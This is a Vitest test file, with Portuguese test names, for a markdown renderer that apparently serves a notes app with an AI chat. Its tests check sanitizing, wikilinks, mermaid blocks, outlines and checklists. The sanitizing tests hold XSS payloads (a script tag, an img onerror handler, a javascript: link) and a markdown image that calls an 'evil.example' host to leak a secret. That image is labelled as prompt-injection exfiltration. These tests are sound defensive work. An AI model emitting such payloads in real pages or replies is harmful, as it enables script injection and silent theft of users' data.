import { describe, expect, it } from "vitest";

import { extractOutline, renderChatMarkdown, renderMarkdown, toggleTask } from "./markdown";

describe("renderMarkdown", () => {
  it("não deixa HTML bruto nem scripts virarem DOM", () => {
    const html = renderMarkdown('<script>alert(1)</script>\n\n<img src=x onerror="alert(1)">\n\n[x](javascript:alert(1))');
    expect(html).not.toContain("<script");
    expect(html).not.toMatch(/<img[^>]*onerror/);
    expect(html).not.toMatch(/href="javascript:/i);
  });

  it("bloqueia imagens externas (exfiltração por prompt injection)", () => {
    const html = renderMarkdown("![vaza](https://evil.example/p?d=segredo)");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("imagem externa bloqueada");
  });

  it("serve imagens da biblioteca pela API", () => {
    expect(renderMarkdown("![logo](assets/logo.png)", "acervo")).toContain('src="/api/assets?path=acervo%2Fassets%2Flogo.png"');
  });

  it("transforma [[wikilinks]] em links com alias e seção", () => {
    const html = renderMarkdown("Veja [[Arquitetura#Dados|o modelo]] e [[bem-vindo]].");
    expect(html).toContain('data-wikilink="Arquitetura"');
    expect(html).toContain(">o modelo</a>");
    expect(html).toContain('data-wikilink="bem-vindo"');
  });

  it("não interpreta wikilink dentro de código", () => {
    expect(renderMarkdown("`[[nao-e-link]]`")).not.toContain("data-wikilink");
  });

  it("reserva blocos mermaid para renderização posterior", () => {
    const html = renderMarkdown("```mermaid\nflowchart LR\n  A --> B\n```");
    expect(html).toContain('class="mermaid-block"');
    expect(html).toContain("flowchart LR\n  A --&gt; B");
  });

  it("ignora o frontmatter YAML no preview", () => {
    expect(renderMarkdown("---\ntitle: X\n---\n# Corpo")).not.toContain("title: X");
  });

  it("links externos abrem fora, sem referrer", () => {
    expect(renderMarkdown("[site](https://example.com)")).toContain('rel="noopener noreferrer"');
  });
});

describe("renderChatMarkdown", () => {
  it("remove qualquer imagem da resposta do chat", () => {
    expect(renderChatMarkdown("![x](assets/a.png)")).not.toContain("<img");
  });
});

describe("extractOutline", () => {
  it("lista títulos com nível e linha, ignorando código", () => {
    expect(extractOutline("# A\ntexto\n```\n# não\n```\n## B")).toEqual([
      { level: 1, text: "A", line: 1 },
      { level: 2, text: "B", line: 6 },
    ]);
  });
});

describe("checklists", () => {
  it("vira caixa clicável apontando a linha da fonte, descontando o frontmatter", () => {
    const html = renderMarkdown("---\ntitle: x\n---\n# T\n\n- [ ] fazer\n- [x] feito");
    expect(html).toContain('data-task-line="5"');
    expect(html).toContain('aria-checked="true" data-task-line="6"');
  });

  it("alterna a marcação só na linha indicada", () => {
    expect(toggleTask("- [ ] a\n- [ ] b", 1)).toBe("- [ ] a\n- [x] b");
    expect(toggleTask("- [x] a", 0)).toBe("- [ ] a");
  });
});
